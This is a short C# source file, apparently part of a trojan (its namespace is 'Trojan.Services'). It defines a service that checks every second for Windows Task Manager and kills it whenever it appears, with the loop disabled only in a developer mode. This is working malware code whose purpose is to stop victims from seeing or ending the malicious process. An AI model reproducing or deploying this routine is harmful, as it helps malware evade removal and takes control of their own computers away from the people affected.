using System.Diagnostics;
using System.Threading.Tasks;

namespace Trojan.Services
{
    public class TaskManagerMonitorService
    {
        private bool _running;

        public void Start()
        {
            if (!App._devMode)
            {
                _running = true;   
            }

            Task.Run(async () =>
            {
                while (_running)
                {
                    try
                    {
                        Process[] processes =
                        Process.GetProcessesByName("Taskmgr");

                        foreach (Process process in processes)
                        {
                            process.Kill();
                        }
                    }


                    catch
                    {
                    }
                    Thread.Sleep(1000);

                }
            });
        }

        public void Stop()
        {
            _running = false;
        }
    }
}